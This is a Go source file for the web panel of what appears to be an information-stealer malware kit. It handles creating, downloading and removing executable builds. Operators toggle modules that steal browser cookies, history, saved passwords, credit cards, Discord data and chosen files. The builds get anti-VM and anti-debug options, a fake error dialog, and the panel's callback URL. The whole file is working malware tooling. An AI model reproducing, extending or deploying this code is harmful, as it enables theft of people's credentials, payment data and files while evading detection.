package user

import (
	"crypto/md5"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path"
	"path/filepath"
	"server/config"
	"server/global"
	"server/lang"
	"server/lib"
	"strings"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/venom/builder"
)

func Build(c *fiber.Ctx) error {
  return lib.Render(c, "build/build", fiber.Map{
    "builds": global.Builds,
  })
}

func BuildCreate(c *fiber.Ctx) error {
  return lib.Render(c, "build/create", fiber.Map{})
}

func UpdateBuild(token string, s string) bool {
  for i, b := range global.Builds {
    if b.Token == token {
      global.Builds[i].Status = s
      lib.SaveDB("builds", &global.Builds)
      return true
    }
  }
  return false
}

func BuildCreatePost(c *fiber.Ctx) error {
  data := struct{
    Name       string `form:"name"`
    Cookie     string `form:"cookie"`
    History    string `form:"history"`
    Password   string `form:"password"`
    Card       string `form:"card"`
    Discord    string `form:"discord"`
    Files      string `form:"files"`
    Error      string `form:"error"`
    FilesMax   int    `form:"files_max"`
    FilesExt   string `form:"files_exts"`
    FilesDir   string `form:"files_dirs"`
    ErrorTitle string `form:"error_title"`
    ErrorMsg   string `form:"error_msg"`
  }{}

  err := c.BodyParser(&data)
  if err != nil {
    log.Printf("Failed to parse data: %s", err)
    return c.Redirect("/")
  }

  if data.FilesMax <= 0 || data.FilesMax > 5120 {
    data.FilesMax = 10
  }

  token := lib.MakeRandom(15)
  buildsdir := path.Join("db", "builds")
  err = os.Mkdir(buildsdir, os.ModePerm)
  if err != nil && !os.IsExist(err) {
    log.Printf("Failed to create the builds dir: %s", err.Error())
    return lib.Render(c, "build/build", fiber.Map{
      "builds": global.Builds,
      "error": lang.GetLang("general.internal"),
    })
  }
  
  sourcedir := path.Join("..", "agent")
  buildfile := path.Join(buildsdir, token)
  buildfile, err = filepath.Abs(buildfile)
  if err != nil {
    log.Println("Failed to get the absolute build file")
    return lib.Render(c, "build/build", fiber.Map{
      "builds": global.Builds,
      "error": lang.GetLang("general.internal"),
    })
  }

  cfgfile := path.Join(buildsdir, token+".cfg")
  cfgfile, err = filepath.Abs(cfgfile)
  if err != nil {
    log.Println("Failed to get the absolute config file")
    return lib.Render(c, "build/build", fiber.Map{
      "builds": global.Builds,
      "error": lang.GetLang("general.internal"),
    })
  }

  st, err := os.Stat(sourcedir)
  if err != nil || !st.IsDir() {
    log.Println("Failed to get the agent source directory")
    return lib.Render(c, "build/build", fiber.Map{
      "builds": global.Builds,
      "error": lang.GetLang("general.internal"),
    })
  }

  build := global.TBuild{
    Name: data.Name,
    Token: token,
    Path: path.Join("db", "builds", token),
    Enabled: true,
    Status: "ongoing",
    Config: global.TConfig{
      Token: token,
      URL: config.GetURL(),
      Quiet: !config.InDebug(),
      AntiVM: config.UseAntiVM(),
      AntiDebug: config.UseAntiDebug(),
      Files: global.TFilesConfig{
        Max: data.FilesMax,
        Dirs: strings.Split(data.FilesDir, ","),
        Exts: strings.Split(data.FilesExt, ","),
      },
      Error: global.TErrorConfig{
        Title: data.ErrorTitle,
        Message: data.ErrorMsg,
      },
    },
  }  

  if data.Cookie == "on" {
   build.Config.Modules = append(build.Config.Modules, "cookie") 
  }

  if data.History == "on" {
   build.Config.Modules = append(build.Config.Modules, "history") 
  }

  if data.Password == "on" {
   build.Config.Modules = append(build.Config.Modules, "password") 
  }

  if data.Card == "on" {
   build.Config.Modules = append(build.Config.Modules, "card") 
  }

  if data.Discord == "on" {
   build.Config.Modules = append(build.Config.Modules, "discord") 
  }

  if data.Files == "on" {
   build.Config.Modules = append(build.Config.Modules, "files") 
  }

  if data.Error == "on" {
   build.Config.Modules = append(build.Config.Modules, "error") 
  }

  cfg, err := json.Marshal(build.Config)
  if err != nil {
    log.Println("Failed to marshal the config")
    return lib.Render(c, "build/build", fiber.Map{
      "builds": global.Builds,
      "error": lang.GetLang("general.internal"),
    })
  }

  global.Builds = append(global.Builds, build)
  lib.SaveDB("builds", &global.Builds)
    
  var ctx builder.Ctx
  ctx.Dir = "../agent"
  ctx.Out = buildfile
  ctx.Key = []byte("")
  ctx.Debug = config.InDebug()
  ctx.Config = cfg

  go func(){
    err = builder.Run(&ctx) 
    if err != nil {
      log.Printf("Failed to run the build tool: %s", err.Error())
      UpdateBuild(token, "failed")
      return
    }
      
    _, err = os.Stat(buildfile)
    if err != nil {
      log.Printf("Failed to stat the build: %s", err.Error())
      UpdateBuild(token, "failed")
      return
    }
      
    ret := UpdateBuild(token, "success")
    if ret {
      log.Printf("Completed build for %s", token)
    }
  }()

  return lib.Render(c, "build/build", fiber.Map{
    "builds": global.Builds,
  })
}

func BuildDownload(c *fiber.Ctx) error {
  token := c.Query("token")
  if token == "" {
    return lib.Render(c, "build/build", fiber.Map{
      "builds": global.Builds,
      "error": lang.GetLang("build.badtoken"),
    })
  }

  for _, b := range global.Builds {
    if b.Token == token && b.Enabled {
      sum := md5.New()
      res := fmt.Sprintf("%x", sum.Sum([]byte(b.Token+b.Name)))
      c.Set("Content-Disposition", "attachment; filename="+res[:6]+".exe")
      return c.SendFile(b.Path, false)
    }
  }

  return lib.Render(c, "build/build", fiber.Map{
    "builds": global.Builds,
    "error": lang.GetLang("build.badtoken"),
  })
}

func BuildRemove(c *fiber.Ctx) error {
  token := c.Query("token")
  if token == "" {
    return lib.Render(c, "build/build", fiber.Map{
      "builds": global.Builds,
      "error": lang.GetLang("build.badtoken"),
    })
  }

  for i := range global.Builds {
    if global.Builds[i].Token == token {
      global.Builds[i].Enabled = false
      buildf := path.Join("db", "builds", global.Builds[i].Token)
      os.Remove(buildf)

      lib.SaveDB("builds", global.Builds)
      return lib.Render(c, "build/build", fiber.Map{
        "builds": global.Builds,
        "success": lang.GetLang("build.remove"),
      })
    }
  } 

  return lib.Render(c, "build/build", fiber.Map{
    "builds": global.Builds,
    "error": lang.GetLang("build.badtoken"),
  })
 }
